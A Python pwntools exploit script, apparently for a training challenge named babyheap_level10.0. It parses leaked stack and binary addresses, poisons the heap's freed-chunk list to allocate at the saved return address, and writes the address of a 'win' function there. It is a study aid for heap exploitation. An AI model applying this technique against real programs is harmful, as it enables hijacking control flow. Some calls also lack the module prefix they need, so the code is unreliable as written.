#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "/challenge/babyheap_level10.0"
LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"  # Adjust as necessary
LD = "/lib64/ld-linux-x86-64.so.2"  # Adjust as necessary

# Load the binary and other relevant files
exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8 = pwn.p8
u8 = pwn.u8

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    if pwn.args.GDB:
        pwn.gdb.attach(pwn.connect(pwn.args.HOST or '127.0.0.1', int(pwn.args.PORT or 1337)), gdbscript=gdbscript)
    return pwn.connect(pwn.args.HOST or '127.0.0.1', int(pwn.args.PORT or 1337))

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def exploit():
    #--------Setup--------#
    context(arch="amd64", os="linux")
    elf = ELF(BINARY, checksec=False)

    #--------Exploit Logic--------#
    p = process(BINARY)
    
    def malloc_to_1(loc: bytes):
        '''Allocate and free memory, then set up for further allocations'''
        p.sendline(b'malloc')
        p.sendline(b'0')
        p.sendline(b'100')
        p.sendline(b'malloc')
        p.sendline(b'1')
        p.sendline(b'100')
        p.sendline(b'free')
        p.sendline(b'0')
        p.sendline(b'free')
        p.sendline(b'1')
    
        p.sendline(b'scanf')
        p.sendline(b'1')
        p.recv()
        p.sendline(loc)
        p.sendline(b'malloc')
        p.sendline(b'2')
        p.sendline(b'100')
        p.sendline(b'malloc')
        p.sendline(b'1')
        p.sendline(b'100')
    
    def scanf_to_pos(buf: bytes, pos: bytes):
        '''Send data to scanf and read results'''
        p.sendline(b'scanf')
        p.sendline(pos)
        p.recv()
        p.sendline(buf)
        p.recv()
    
    # Leak stack address
    p.recvuntil(b'LEAK')
    p.recvuntil(b'at: ')
    stack_leak = p.recvuntil(b'.')[:-1]
    ret_addr = int(stack_leak, 16) + 0x118

    # Leak main address
    p.recvuntil(b'LEAK')
    p.recvuntil(b'at: ')
    main_leak = p.recvuntil(b'.')[:-1]
    binary_base = int(main_leak, 16) - elf.sym.main
    elf.address = binary_base
    
    # Perform the memory manipulation
    malloc_to_1(p64(ret_addr))
    scanf_to_pos(p64(elf.sym.win), b'1')
    p.sendline(b'quit')

    # Interact with the process
    p.interactive()

if __name__ == "__main__":
    exploit()
